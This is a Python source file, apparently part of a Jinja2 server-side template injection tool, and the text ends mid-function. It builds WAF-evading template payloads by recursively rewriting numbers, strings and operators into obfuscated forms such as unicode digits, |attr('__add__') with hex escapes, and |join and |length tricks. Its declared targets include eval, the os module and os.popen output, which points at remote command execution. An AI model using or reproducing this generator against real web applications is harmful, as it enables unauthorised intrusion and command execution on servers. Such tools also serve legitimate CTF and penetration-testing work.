"""
生成和要求相符合的表达式，如('a'+'b')
生成过程为接受一个生成目标（如`(STRING, 'ab')`），遍历对应的生成规则expression_gen，利用waf函数
递归检查生成规则是否符合，并最终生成一个字符串形式的表达式
expression_gen：所有表达式生成规则
    接受一个生成目标，并返回一个生成目标的列表
    比如说接收(STRING, 'ab')，返回[(LITERAL, '"a"'), (LITERAL, '"b"')]
    也就是将一个生成目标“展开成”一系列生成目标
PayloadGen：将用户提供的生成目标一层层展开，并使用WAF检测展开后是否可以通过WAF，然后
    根据展开结果返回相应的表达式。
"""

# make pylint shut up, these are rules for generating expression, not normal code containing logic.
# pylint: disable=wildcard-import,unused-wildcard-import,missing-function-docstring,logging-format-interpolation,unused-argument,consider-using-f-string,too-many-lines
# flake8: noqa

import re
import logging
import sys
import math
import random
import string

from collections import defaultdict
from typing import (
    Callable,
    DefaultDict,
    List,
    Dict,
    TypeVar,
    Union,
    Any,
    Tuple,
)

from .colorize import colored
from .const import *

ContextVariable = Dict[str, Any]

if sys.version_info >= (3, 8):
    from typing import Literal

    LiteralTarget = Tuple[Literal["literal"], str]
    ExpressionTarget = Tuple[Literal["expression"], int, List["Target"]]
    EncloseUnderTarget = Tuple[Literal["enclose_under"], int, List["Target"]]
    UnsatisfiedTarget = Tuple[Literal["unsatisfied"],]
    OneofTarget = Tuple[Literal["oneof"], List["Target"]]
    WithContextVarTarget = Tuple[Literal["with_context_var"], str]
    JinjaContextVarTarget = Tuple[Literal["jinja_context_var"], str]
    FlaskContextVarTarget = Tuple[Literal["flask_context_var"], str]
    ZeroTarget = Tuple[Literal["zero"],]
    PositiveIntegerTarget = Tuple[Literal["positive_integer"], int]
    IntegerTarget = Tuple[Literal["integer"], int]
    StringConcatTarget = Tuple[Literal["string_string_concat"],]
    StringPercentTarget = Tuple[Literal["string_percent"],]
    StringPercentLowerCTarget = Tuple[Literal["string_percent_lower_c"],]
    StringUnderlineTarget = Tuple[Literal["string_underline"],]
    StringLowerCTarget = Tuple[Literal["string_lower_c"],]
    StringManyPercentLowerCTarget = Tuple[Literal["string_many_percent_lower_c"], int]
    StringManyFormatCTarget = Tuple[Literal["string_many_format_c"], int]
    CharTarget = Tuple[Literal["char"], str]
    StringTarget = Tuple[Literal["string"], str]
    FormularSumTarget = Tuple[Literal["formular_sum"], List["Target"]]
    AttributeTarget = Tuple[Literal["attribute"], "Target", str]
    ItemTarget = Tuple[Literal["item"], "Target", str]
    ChassAttributeTarget = Tuple[Literal["class_attribute"], "Target", str]
    ChainedAttriuteItemTarget = Tuple[Literal["chained_attribute_item"], ...]
    ImportFuncTarget = Tuple[Literal["import_func"],]
    EvalFuncTarget = Tuple[Literal["eval_func"],]
    EvalTarget = Tuple[Literal["eval"], str]
    ConfigTarget = Tuple[Literal["config"],]
    ModuleOSTarget = Tuple[Literal["module_os"],]
    OSPopenObj = Tuple[Literal["os_popen_obj"],]
    OSPopenRead = Tuple[Literal["os_popen_read"],]
    # Target = LiteralTarget
    Target = Union[
        LiteralTarget,
        ExpressionTarget,
        EncloseUnderTarget,
        UnsatisfiedTarget,
        OneofTarget,
        WithContextVarTarget,
        FlaskContextVarTarget,
        JinjaContextVarTarget,
        ZeroTarget,
        PositiveIntegerTarget,
        IntegerTarget,
        StringConcatTarget,
        StringPercentTarget,
        StringPercentLowerCTarget,
        StringUnderlineTarget,
        StringLowerCTarget,
        StringManyPercentLowerCTarget,
        StringManyFormatCTarget,
        CharTarget,
        StringTarget,
        FormularSumTarget,
        AttributeTarget,
        ItemTarget,
        ChassAttributeTarget,
        ChainedAttriuteItemTarget,
        ImportFuncTarget,
        EvalFuncTarget,
        EvalTarget,
        ConfigTarget,
        ModuleOSTarget,
        OSPopenObj,
        OSPopenRead,
    ]
else:
    LiteralTarget = Tuple
    ExpressionTarget = Tuple
    EncloseUnderTarget = Tuple
    UnsatisfiedTarget = Tuple
    OneofTarget = Tuple
    WithContextVarTarget = Tuple
    FlaskContextVarTarget = Tuple
    JinjaContextVarTarget = Tuple
    Target = Tuple


ExpressionGeneratorReturn = TypeVar("ExpressionGeneratorReturn", bound=List[Target])
ExpressionGenerator = Callable[..., ExpressionGeneratorReturn]
TargetAndSubTargets = List[Tuple[Target, List[Target]]]
PayloadGeneratorResult = Tuple[str, ContextVariable, Union[TargetAndSubTargets, None]]

expression_gens: DefaultDict[str, List[ExpressionGenerator]] = defaultdict(list)
logger = logging.getLogger("payload_gen")

gen_weight_default = {
    "gen_string_percent_lower_c_concat": 1,
    "gen_string_lower_c_joinerbatch": 1,
    "gen_string_percent_urlencode2": 1,
    "gen_string_concat1": 1,
    "gen_string_concat2": 1,
    "gen_string_formatpercent": 1,
    "gen_attribute_attrfilter": 1,
    "gen_item_dunderfunc": 1,
}

precedence = [
    ["enclose", "literal", "flask_context_var", "jinja_context_var"],
    [
        "item",
        "attribute",
        "slide",
        "function_call",
    ],
    ["filter"],
    [
        "power",
    ],
    ["positive", "negative", "bitwise_not"],
    [
        "multiply",
        "matrix_multiply",
        "divide",  # '/'
        "true_divide",  # '//'
        "mod",
    ],
    [
        "plus",
        "subtract",
    ],
    [
        "tilde"
        # 1.0<2~"3" -> '<' not supported between instances of 'float' and 'str'
        # 1.0+2~"3" -> unsupported operand type(s) for +: 'float' and 'str'
    ],
    [
        "comparison",  # <= >= etc.
    ],
    [
        "boolean_not",
    ],
    [
        "boolean_and",
    ],
    [
        "boolean_or",
    ],
    [
        "ifelse",
    ],
][::-1]

precedence = {name: i for i, lst in enumerate(precedence) for name in lst}


def expression_gen(f: ExpressionGenerator):
    gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
    if not gen_type:
        raise RuntimeError(f"Error found when register payload generator {f.__name__}")
    expression_gens[gen_type.group(1)].append(f)


def unparse(tree):
    content = ""
    for target, subtree in tree:
        if target[0] == WITH_CONTEXT_VAR:
            continue
        if target[0] in [LITERAL, FLASK_CONTEXT_VAR, JINJA_CONTEXT_VAR]:
            content += target[1]
        elif target[0] == ONEOF:
            content += unparse(subtree)
        elif subtree:
            content += unparse(subtree)
    return content


def iter_subtree(tree):
    for target, subtree in tree:
        # 需要跳过literal等, 因为其可能不是一个表达式而是一个或者多个token
        if subtree and (
            target[0]
            not in [
                "literal",
                "oneof",
                "string_string_concat",
            ]
        ):
            yield from iter_subtree(subtree)
    yield unparse(tree), tree


def find_bad_exprs(tree, is_expr_bad_func):
    nodes = []
    for payload_unparsed, targetlist in iter_subtree(tree):
        if is_expr_bad_func(payload_unparsed):
            nodes.append((payload_unparsed, targetlist))
    return nodes


def join_target(sep, targets):
    assert len(targets) >= 1
    ret = [
        targets[0],
    ]
    for target in targets[1:]:
        ret.append(sep)
        ret.append(target)
    return ret


def tree_precedence(tree):
    answer = float("inf")
    for target, sub_target_tree in tree:
        if target[0] in [LITERAL, UNSATISFIED]:
            pass
        elif target[0] in [PLUS, MULTIPLY, MOD, ]:
            # might be transformed into filters
            sub_target_answer = tree_precedence(sub_target_tree)
            if sub_target_answer:
                answer = min(answer, sub_target_answer)
        elif target[0] == EXPRESSION:
            answer = min(answer, target[1])
        elif target[0] in precedence:
            answer = min(answer, precedence[target[0]])
        elif sub_target_tree:
            sub_target_answer = tree_precedence(sub_target_tree)
            if sub_target_answer:
                answer = min(answer, sub_target_answer)
    return answer if answer != float("inf") else None


def str_escape(value: str, quote="'"):
    """
    转义字符串中的引号和反斜杠，但不会在两旁加上引号。
    用法："'{}'".format(str_escape("asdf", "'"))
    """
    return value.replace("\\", "\\\\").replace(quote, "\\" + quote)

class CacheByRepr:
    def __init__(self):
        self.cache = {}

    def __setitem__(self, k, v):
        repr_k = repr(k)
        self.cache[repr_k] = self.cache.get(repr_k, [])
        self.cache[repr(k)].append((k, v))

    def __getitem__(self, k):
        repr_k = repr(k)
        for k_store, v in self.cache.get(repr_k, []):
            if k_store == k:
                return v
        raise KeyError(f"Not found: {repr_k}")

    def __contains__(self, k):
        repr_k = repr(k)
        for k_store, v in self.cache.get(repr_k, []):
            if k_store == k:
                return True
        return False

    def __iter__(self):
        return (k for k_repr in self.cache for k, v in self.cache[k_repr])
    def clear(self):
        self.cache = {}

class PayloadGenerator:
    """生成一个表达式，如('a'+'b')
    其会遍历对应的expression_gen，依次“展开”生成目标为一个生成目标的列表，递归地
    将每一个元素转为payload，拼接在一起并使用WAF函数检测是否合法。
    """

    def __init__(
        self,
        waf_func: Callable[[str], bool],
        context: Union[Dict, None] = None,
        callback: Union[Callable[[str, Dict], None], None] = None,
        detect_mode: str = DETECT_MODE_ACCURATE,
        environment: str = ENVIRONMENT_JINJA,
        waf_expr_func: Union[Callable[[str], bool], None] = None,
    ):
        self.waf_func = (
            waf_func
            if waf_expr_func is None
            else (lambda x: waf_func(x) and waf_expr_func(x))
        )
        self.context = context if context else {}
        self.cache_by_repr = CacheByRepr()
        self.used_count = defaultdict(int)
        self.detect_mode = detect_mode
        if detect_mode == DETECT_MODE_FAST:
            for k, v in gen_weight_default.items():
                self.used_count[k] += v
        self.environment = environment
        self.callback = callback if callback else (lambda x, y: None)

    # it is correct pylint, it returns a internal decorator.
    def create_generate_func_register():  # pylint: disable=no-method-argument
        generate_funcs = []

        def register(checker_func):
            def _wraps(runner_func):
                generate_funcs.append((checker_func, runner_func))
                return runner_func

            return _wraps

        return generate_funcs, register

    generate_funcs, register_generate_func = create_generate_func_register()

    def generate_by_list(
        self, targets: List[Target]
    ) -> Union[PayloadGeneratorResult, None]:
        """根据一个生成目标的列表生成payload并使用WAF测试

        Args:
            targets (List[Target]): 生成目标的列表

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果，其包含payload和payload用到的上下文中的变量
        """
        str_result, used_context, tree = "", {}, []
        for target in targets:
            for checker, runner in self.generate_funcs:
                if not checker(self, target):
                    continue
                result = runner(self, target)
                if result is None:
                    return None
                s, c, subs = result
                str_result += s
                used_context.update(c)
                tree.append((target, subs))
                break
            else:
                raise RuntimeError("it shouldn't runs this line")
        if not self.waf_func(str_result):
            return None
        return str_result, used_context, tree

    @register_generate_func(lambda self, target: target[0] == LITERAL)
    def literal_generate(
        self, target: LiteralTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """为literal类型的生成目标生成payload

        Args:
            target (LiteralTarget): 生成目标

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        # if self.detect_mode == DETECT_MODE_ACCURATE and not self.waf_func(target[1]):
        #     return None
        return (target[1], {}, None)

    @register_generate_func(
        lambda self, target: target in self.cache_by_repr
    )
    def cache_generate(self, target: Target) -> Union[PayloadGeneratorResult, None]:
        """为已经缓存的生成目标生成payload

        Args:
            target (Target): 生成目标

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        return self.cache_by_repr[target]

    @register_generate_func(lambda self, target: target[0] == EXPRESSION)
    def expression_generate(
        self, target: ExpressionTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """为expression的生成目标生成payload
        expression中有其的优先级和target列表，直接返回target列表

        Args:
            target (ExpressionTarget): 生成目标

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        assert isinstance(target[2], list) and all(
            isinstance(sub_target, tuple) for sub_target in target[2]
        ), repr(target)[:100]
        return self.generate_by_list(target[2])

    @register_generate_func(lambda self, target: target[0] == ENCLOSE_UNDER)
    def enclose_under_generate(
        self, target: EncloseUnderTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """为enclose_under的生成目标生成payload
        enclose_under中有其的优先级和target
        如果生成结果优先级更高则直接返回target的生成结果
        否则加上括号

        Args:
            target (EncloseUnderTarget): 生成目标

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        assert isinstance(target[2], tuple), repr(target)
        result = self.generate_by_list([target[2]])
        if not result:
            return
        str_result, used_context, tree = result
        result_precedence = tree_precedence(tree)
        assert result_precedence is not None, str_result + repr(tree)
        if result_precedence < target[1]:
            logger.debug(
                (
                    "enclose_under_generate: result_precedence < "
                    + "target[1], result_precedence=%d, target[1]=%s"
                ),
                result_precedence,
                target[1],
            )
            ret = self.generate_by_list([(ENCLOSE, target[2])])
            return ret
        return str_result, used_context, tree

    @register_generate_func(lambda self, target: target[0] == UNSATISFIED)
    def unsatisfied_generate(self, target: UnsatisfiedTarget) -> None:
        """直接拒绝类型为unsatisfied的生成目标"""
        return None

    @register_generate_func(lambda self, target: target[0] == ONEOF)
    def oneof_generate(
        self, target: OneofTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """生成类型为oneof的生成目标，遍历其中的每一个子目标并选择其中一个生成

        Args:
            target (OneofTarget): oneof生成目标，其中有多个生成目标列表

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        _, *alternative_targets = target
        for req in alternative_targets:
            ret = self.generate_by_list(req)
            if ret is not None:
                return ret
        return None

    @register_generate_func(lambda self, target: target[0] == WITH_CONTEXT_VAR)
    def with_context_var_generate(
        self, target: WithContextVarTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """生成类型为with_context_var的生成目标，将其中包含的变量名加入到已经使用的变量中

        Args:
            target (WithContextVarTarget): 生成目标

        Returns:
            _type_: 生成结果
        """
        return ("", {target[1]: self.context[target[1]]}, None)

    @register_generate_func(lambda self, target: target[0] == JINJA_CONTEXT_VAR)
    def jinja_context_var_generate(
        self, target: JinjaContextVarTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """生成类型为jinja_context_var_generate的生成目标，将其中包含的变量名加入到已经使用的变量中

        Args:
            target (JinjaContextVarTarget): 生成目标

        Returns:
            _type_: 生成结果
        """
        return (target[1], {}, None)

    @register_generate_func(lambda self, target: target[0] == FLASK_CONTEXT_VAR)
    def flask_context_var_generate(
        self, target: FlaskContextVarTarget
    ) -> Union[PayloadGeneratorResult, None]:
        """生成类型为flask_context_var_generate的生成目标，将其中包含的变量名加入到已经使用的变量中

        Args:
            target (FlaskContextVarTarget): 生成目标

        Returns:
            _type_: 生成结果
        """
        if self.environment != ENVIRONMENT_FLASK:
            return None
        return (target[1], {}, None)

    @register_generate_func(lambda self, target: True)
    def common_generate(self, gen_req: Target) -> Union[PayloadGeneratorResult, None]:
        """为剩下所有类型的生成目标生成对应的payload, 遍历对应的expression_gen，拿到
        对应的生成目标列表并尝试使用这个列表生成payload

        Args:
            gen_req (Target): 生成目标

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果
        """
        gen_type, *args = gen_req
        if gen_type not in expression_gens or len(expression_gens[gen_type]) == 0:
            logger.error("Unknown type: %s", gen_type)
            return None

        gens = expression_gens[gen_type].copy()
        if self.detect_mode == DETECT_MODE_FAST:
            gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
        for gen in gens:
            gen_ret: List[Target] = gen(self.context, *args)
            ret = self.generate_by_list(gen_ret)
            if ret is None:
                continue
            logger.debug("Using gen rule: %s", gen.__name__)
            result = ret[0]
            self.callback(
                CALLBACK_GENERATE_PAYLOAD,
                {
                    "gen_type": gen_type,
                    "args": args,
                    "gen_ret": gen_ret,
                    "payload": result,
                },
            )
            # 为了日志的简洁，仅打印一部分日志
            if gen_type in (INTEGER, STRING) and result != str(args[0]):
                logger.info(
                    "{great}, {gen_type}({args_repl}) can be {result}".format(
                        great=colored("green", "Great"),
                        gen_type=colored("yellow", gen_type, bold=True),
                        args_repl=colored(
                            "yellow", ", ".join(repr(arg) for arg in args)
                        ),
                        result=colored("blue", result),
                    )
                )

            elif gen_type in (
                EVAL_FUNC,
                EVAL,
                CONFIG,
                MODULE_OS,
                OS_POPEN_OBJ,
                OS_POPEN_READ,
            ):
                logger.info(
                    "{great}, we generate {gen_type}({args_repl})".format(
                        great=colored("green", "Great"),
                        gen_type=colored("yellow", gen_type, bold=True),
                        args_repl=colored(
                            "yellow", ", ".join(repr(arg) for arg in args)
                        ),
                    )
                )

            self.cache_by_repr[gen_req] = ret
            self.used_count[gen.__name__] += 1
            return ret
        if gen_type not in (
            CHAINED_ATTRIBUTE_ITEM,
            ATTRIBUTE,
            ITEM,
            PLUS,
            MULTIPLY,
            STRING_CONCAT,
            MOD,
        ):
            logger.info(
                "{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
                    failed=colored("red", "failed"),
                    gen_type=gen_type,
                    args_repl=", ".join(repr(arg) for arg in args),
                )
            )
        self.cache_by_repr[gen_req] = None
        return None

    def generate(self, gen_type, *args) -> Union[str, None]:
        """提供给用户的生成接口，接收一个生成目标的类型和参数

        Args:
            gen_type (str): 生成目标的类型
            *args: 生成目标的参数

        Returns:
            Union[str, None]: 生成结果
        """
        result = self.generate_by_list([(gen_type, *args)])
        if result is None:
            return None
        s, _, _ = result
        return s

    def generate_detailed(self, gen_type, *args) -> Union[PayloadGeneratorResult, None]:
        """提供给用户的生成接口，接收一个生成目标的类型和参数

        Args:
            gen_type (str): 生成目标的类型
            *args: 生成目标的参数

        Returns:
            Union[PayloadGeneratorResult, None]: 生成结果（包含使用的上下文变量）
        """
        result = self.generate_by_list([(gen_type, *args)])
        if result is None:
            return None
        return result


@expression_gen
def gen_variable_of_context(context: dict, var_value) -> List[LiteralTarget]:
    variables = [name for name, value in context.items() if value == var_value]
    if not variables:
        return [(UNSATISFIED,)]
    targets_list = [[(LITERAL, v), (WITH_CONTEXT_VAR, v)] for v in variables]
    return [(ONEOF, *targets_list)]


# ---
@expression_gen
def gen_enclose_normal(context: dict, target) -> List[LiteralTarget]:
    return [
        (EXPRESSION, precedence["enclose"], [(LITERAL, "("), target, (LITERAL, ")")])
    ]


# ---


@expression_gen
def gen_string_concat_plus(context: dict, a, b) -> List[LiteralTarget]:
    return [(PLUS, a, b)]


@expression_gen
def gen_string_concat_tilde(context: dict, a, b) -> List[LiteralTarget]:
    target_list = [
        (ENCLOSE_UNDER, precedence["tilde"], a),
        (LITERAL, "~"),
        (ENCLOSE_UNDER, precedence["tilde"], b),
    ]
    return [(EXPRESSION, precedence["tilde"], target_list)]


# ---


@expression_gen
def gen_string_concatmany_onebyone(context: dict, parts) -> List[LiteralTarget]:
    answer = parts[0]
    for part in parts[1:]:
        answer = (STRING_CONCAT, answer, part)
    return [answer]


@expression_gen
def gen_string_concatmany_join(context: dict, parts) -> List[LiteralTarget]:
    target_list = (
        [
            (LITERAL, "("),
        ]
        + join_target(sep=(LITERAL, ","), targets=parts)
        + [
            (LITERAL, ")|join"),
        ]
    )
    return [(EXPRESSION, precedence["filter"], target_list)]


# ---


@expression_gen
def gen_plus_normal(context: dict, a, b):
    a = (ENCLOSE_UNDER, precedence["plus"], a)
    b = (ENCLOSE_UNDER, precedence["plus"], b)
    return [(EXPRESSION, precedence["plus"], [a, (LITERAL, "+"), b])]


@expression_gen
def gen_plus_addfunc(context: dict, a, b):
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [
                (ENCLOSE_UNDER, precedence["attribute"], a),
                (LITERAL, ".__add__("),
                b,
                (LITERAL, ")"),
            ],
        )
    ]


@expression_gen
def gen_plus_addfuncbyfilter(context: dict, a, b):
    get_add_func = (
        ONEOF,
        [(LITERAL, "|attr('__add__')(")],
        [(LITERAL, '|attr("__add__")(')],
        [(LITERAL, '|attr("\\x5f\\x5fadd\\x5f\\x5f")(')],
        [(LITERAL, "|attr("), (VARIABLE_OF, "__add__"), (LITERAL, ")(")],
    )
    logger.debug("gen_plus_addfuncbyfilter: %s", repr(a))
    return [
        (
            EXPRESSION,
            precedence["filter"],
            [
                (ENCLOSE_UNDER, precedence["filter"], a),
                get_add_func,
                b,
                (LITERAL, ")"),
            ],
        )
    ]


# ---


@expression_gen
def gen_mod_normal(context: dict, a, b):
    a = (ENCLOSE_UNDER, precedence["mod"], a)
    b = (ENCLOSE_UNDER, precedence["mod"], b)
    return [(EXPRESSION, precedence["mod"], [a, (LITERAL, "%"), b])]


@expression_gen
def gen_mod_func(context: dict, a, b):
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [
                (ENCLOSE_UNDER, precedence["attribute"], a),
                (LITERAL, ".__mod__("),
                b,
                (LITERAL, ")"),
            ],
        )
    ]


@expression_gen
def gen_mod_func2(context: dict, a, b):
    mod_func = (
        ONEOF,
        [(LITERAL, "|attr('__mod__')")],
        [(LITERAL, '|attr("__mod__")')],
        [(LITERAL, "|attr("), (VARIABLE_OF, "__mod__"), (LITERAL, ")")],
    )
    return [
        (
            EXPRESSION,
            precedence["filter"],
            [
                (ENCLOSE_UNDER, precedence["filter"], a),
                mod_func,
                (LITERAL, "("),
                b,
                (LITERAL, ")"),
            ],
        )
    ]


# ---


@expression_gen
def gen_function_call_normal(context: dict, function_target, args_target_list):
    target_list = (
        [
            (ENCLOSE_UNDER, precedence["function_call"], function_target),
            (LITERAL, "("),
        ]
        + join_target((LITERAL, ","), args_target_list)
        + [
            (LITERAL, ")"),
        ]
    )
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_function_call_normal2(context: dict, function_target, args_target_list):
    target_list = (
        [
            (ENCLOSE_UNDER, precedence["function_call"], function_target),
            (LITERAL, "("),
        ]
        + join_target((LITERAL, ","), args_target_list)
        + [
            (LITERAL, ","),
            (LITERAL, ")"),
        ]
    )
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ---


@expression_gen
def gen_multiply_normal(context: dict, a, b):
    a = (ENCLOSE_UNDER, precedence["multiply"], a)
    b = (ENCLOSE_UNDER, precedence["multiply"], b)
    return [(EXPRESSION, precedence["multiply"], [a, (LITERAL, "*"), b])]


@expression_gen
def gen_multiply_func(context: dict, a, b):
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [
                (ENCLOSE_UNDER, precedence["attribute"], a),
                (LITERAL, ".__mul__("),
                b,
                (LITERAL, ")"),
            ],
        )
    ]


@expression_gen
def gen_multiply_func2(context: dict, a, b):
    mul_func = (
        ONEOF,
        [(LITERAL, "|attr('__mul__')")],
        [(LITERAL, '|attr("__mul__")')],
        [(LITERAL, "|attr("), (VARIABLE_OF, "__mul__"), (LITERAL, ")")],
    )
    return [
        (
            EXPRESSION,
            precedence["filter"],
            [
                (ENCLOSE_UNDER, precedence["filter"], a),
                mul_func,
                (LITERAL, "("),
                b,
                (LITERAL, ")"),
            ],
        )
    ]


# ---


@expression_gen
def gen_formular_sum_simplesum(context, num_targets):
    # simply sum up with `+` without touching complex rules for PLUS
    target_list = join_target(sep = (LITERAL, "+"), targets = num_targets)
    return [(EXPRESSION, precedence["plus"], target_list)]


@expression_gen
def gen_formular_sum_tuplesum(context, num_targets):
    if len(num_targets) == 1:
        return [num_targets[0]]
    target_list = [
        (LITERAL, "("),
    ] + join_target(sep = (LITERAL, ","), targets = num_targets) + [
        (LITERAL, ")|sum")
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]

@expression_gen
def gen_formular_sum_add(context, num_targets):
    final_target = num_targets[0]
    for target in num_targets[1:]:
        final_target = (PLUS, final_target, target)
    return [final_target]


# ---


@expression_gen
def gen_zero_literal(context: dict):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "0")])]


@expression_gen
def gen_zero_2(context: dict):
    return [(EXPRESSION, precedence["filter"], [(LITERAL, "{}|int")])]


@expression_gen
def gen_zero_3(context: dict):
    return [(EXPRESSION, precedence["filter"], [(LITERAL, "g|urlencode|length")])]


@expression_gen
def gen_zero_4(context: dict):
    return [(EXPRESSION, precedence["filter"], [(LITERAL, "{}|urlencode|count")])]


@expression_gen
def gen_zero_emptylength(context: dict):
    empty_things = [
        [(LITERAL, "''")],
        [(LITERAL, '""')],
        [(LITERAL, "()")],
        [(LITERAL, "( )")],
        [(LITERAL, "(\t)")],
        [(LITERAL, "(\n)")],
        [(LITERAL, "[]")],
        [(LITERAL, "{}")],
    ]
    get_length = [
        [(LITERAL, ".__len__()")],
        [(LITERAL, ".__len__( )")],
        [(LITERAL, ".__len__(\t)")],
        [(LITERAL, ".__len__(\n)")],
    ]
    target_list = [(ONEOF, *empty_things), (ONEOF, *get_length)]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ---


@expression_gen
def gen_positive_integer_simple(context: dict, value: int):
    if value < 0:
        return [(UNSATISFIED,)]
    return [(EXPRESSION, precedence["literal"], [(LITERAL, str(value))])]


@expression_gen
def gen_positive_integer_hex(context: dict, value: int):
    if value < 0:
        return [(UNSATISFIED,)]
    return [(EXPRESSION, precedence["literal"], [(LITERAL, hex(value))])]


@expression_gen
def gen_positive_integer_underline(context: dict, value: int):
    if value < 0:
        return [(UNSATISFIED,)]
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "_".join(str(value)))])]


# jinja最新版的integer token正则如下：
# integer_re = re.compile(
#     r"""
#     (
#         0b(_?[0-1])+ # binary
#     |
#         0o(_?[0-7])+ # octal
#     |
#         0x(_?[\da-f])+ # hex    <--- 这个支持unicode
#     |
#         [1-9](_?\d)* # decimal    <--- 这个支持unicode
#     |
#         0(_?0)* # decimal zero
#     )
#     """,
#     re.IGNORECASE | re.VERBOSE,
# )


@expression_gen
def gen_positive_integer_unicode(context: dict, value: int):
    if value <= 9:
        return [(UNSATISFIED,)]
    chars = [
        c if i == 0 else chr(ord(c) + ord("０") - ord("0"))
        for i, c in enumerate(str(value))
    ]
    targets_list = [(LITERAL, c) for c in chars]
    return [(EXPRESSION, precedence["literal"], targets_list)]


@expression_gen
def gen_positive_integer_unicodehex(context: dict, value: int):
    if value <= 0:
        return [(UNSATISFIED,)]
    chars = [
        chr(ord(c) + ord("０") - ord("0")) if ord("0") <= ord(c) <= ord("9") else c 
        for i, c in enumerate(hex(value)[2:])
    ]
    targets_list = [(LITERAL, "0x")] + [(LITERAL, c) for c in chars]
    return [(EXPRESSION, precedence["literal"], targets_list)]


@expression_gen
def gen_positive_integer_sum(context: dict, value: int):
    if value < 0:
        return [(UNSATISFIED,)]

    ints = [
        (var_name, var_value)
        for var_name, var_value in context.items()
        if isinstance(var_value, int) and var_value > 0
    ]

    if ints == []:
        return [(UNSATISFIED,)]

    ints.sort(key=lambda pair: pair[1], reverse=True)
    value_left = value
    payload_vars = []
    while value_left != 0:
        while ints and ints[0][1] > value_left:
            ints = ints[1:]
        if not ints:
            return [(UNSATISFIED,)]
        value_left -= ints[0][1]
        payload_vars.append(ints[0][0])
    ints = [
        (EXPRESSION, precedence["literal"], [(LITERAL, v)])
        for v in payload_vars
    ]
    return [(FORMULAR_SUM, ints)] + [
        (WITH_CONTEXT_VAR, v) for v in payload_vars
    ]


@expression_gen
def gen_positive_integer_recurmulitiply(context: dict, value: int):
    xs = [x for x in range(3, value // 2) if value % x == 0]
    xs.sort(key=lambda x: max(x, value // x))
    if xs == [] or value < 20:
        return [(UNSATISFIED,)]
    target_list = [
        (
            ONEOF,
            *[
                [
                    (LITERAL, "("),
                    (POSITIVE_INTEGER, value // x),
                    (LITERAL, "*"),
                    (POSITIVE_INTEGER, x),
                    (LITERAL, ")"),
                ]
                for x in xs
            ],
        )
    ]
    return [(EXPRESSION, precedence["multiply"], target_list)]


@expression_gen
def gen_positive_integer_recurmultiply2(context: dict, value: int):
    if value <= 20:
        return [(UNSATISFIED,)]
    alternatives = []
    for i in range(9, 3, -1):
        lst = [(LITERAL, "+"), (POSITIVE_INTEGER, value % i)] if value % i != 0 else []
        alternative = (
            [
                (LITERAL, "("),
                (POSITIVE_INTEGER, value // i),
                (LITERAL, "*"),
                (POSITIVE_INTEGER, i),
            ]
            + lst
            + [
                (LITERAL, ")"),
            ]
        )
        alternatives.append(alternative)
    if not alternatives:
        return [(UNSATISFIED,)]
    target_list = [(ONEOF, *alternatives)]
    return [(EXPRESSION, precedence["plus"], target_list)]


@expression_gen
def gen_positive_integer_recurmulnoastral(context: dict, value: int):
    if value <= 20:
        return [(UNSATISFIED,)]
    alternatives = []
    pieces_max = int(math.sqrt(value)) + 2
    for i in range(3, pieces_max):
        # value = a * i + b
        a, b = (value // i), (value % i)
        if a > pieces_max:
            continue
        if b == 0:
            alternative = [(MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i))]
            alternatives.insert(0, alternative)
        else:
            alternative = [
                (
                    PLUS,
                    (MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i)),
                    (POSITIVE_INTEGER, b),
                )
            ]
            alternatives.append(alternative)
    if not alternatives:
        return [(UNSATISFIED,)]
    target_list = [(ONEOF, *alternatives)]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_positive_integer_dictlength(context: dict, value: int):
    target_list = [(LITERAL, "dict({}=x)|join|length".format("x" * value))]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_positive_integer_length(context: dict, value: int):
    lengthy_tuples_zero = (
        [
            (LITERAL, "("),
        ]
        + join_target((LITERAL, ","), [(ZERO,) for _ in range(value)])
        + [
            (LITERAL, ")"),
        ]
    )
    lengthy_tuples_x = (
        [
            (LITERAL, "("),
        ]
        + [
            (
                ONEOF,
                *[
                    join_target(
                        (LITERAL, ","), [(LITERAL, chr(c)) for _ in range(value)]
                    )
                    for c in range(ord("a"), ord("z") + 1)
                ],
            )
        ]
        + [
            (LITERAL, ")"),
        ]
    )
    target_list = [
        (ONEOF, lengthy_tuples_x, lengthy_tuples_zero),
        (
            ONEOF,
            [(LITERAL, ".__len__()")],
            [(LITERAL, ".__len__( )")],
            [(LITERAL, ".__len__(\t)")],
            [(LITERAL, ".__len__(\n)")],
            # [(LITERAL, "|length")],
        ),
    ]
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            target_list,
        )
    ]


@expression_gen
def gen_positive_integer_numbersum1(context: dict, value: int):
    if value < 5:
        return [(UNSATISFIED,)]
    alternative = []
    for i in range(min(40, value - 1), 3, -1):
        inner = "+".join([str(i)] * (value // i) + [str(value % i)])
        alternative.append([(LITERAL, inner)])
    target_list = [(ONEOF, *alternative)]
